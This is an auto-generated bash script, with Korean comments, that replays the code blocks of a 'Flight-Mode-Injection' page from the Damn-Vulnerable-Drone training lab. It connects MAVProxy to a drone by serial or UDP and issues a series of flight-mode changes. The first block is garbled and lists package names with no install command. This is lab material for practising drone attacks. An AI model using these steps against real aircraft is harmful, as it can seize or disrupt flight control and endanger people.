#!/usr/bin/env bash
# Auto-generated from: /home/kali/MTD_full_testbed/Damn-Vulnerable-Drone.wiki/Flight-Mode-Injection.md
# Created: 2025-09-14 13:46:03
# NOTE: 설명/서사는 제거되었고, 코드블록/프롬프트 명령만 포함됩니다.
set -euo pipefail

# 기준 경로 (요구사항)
export BASE="${BASE:-$PWD}"

# 공통 로그 연결(선택사항) - 존재 시 로드
if [[ -f "$BASE/00_env.sh" ]]; then . "$BASE/00_env.sh"; else
  DVD_LOG="${DVD_LOG:-$BASE/attack_output/dvd.log}"; mkdir -p "$(dirname "$DVD_LOG")"
  log(){ echo "[`date +%F_%T`] $*"; }; export -f log
fi

log "[ATTACK] id=flight-mode-injection src=Flight-Mode-Injection.md"
log "[BLOCK 1] type=shell"
python3-pip python3-matplotlib python3-lxml python3-pygame
echo 'export PATH="$PATH:$HOME/.local/bin"' >> ~/.bashrc

log "[BLOCK 2] type=shell"
mavproxy.py --master=/dev/ttyUSB0 --baudrate 57600 --aircraft MyAircraft

log "[BLOCK 3] type=shell"
mavproxy.py --master=udp:127.0.0.1:14550

log "[BLOCK 4] type=shell"
mode

log "[BLOCK 5] type=shell"
mode stabilize
mode acro
mode alt_hold
mode auto
mode guided
mode loiter
mode rtl
mode land

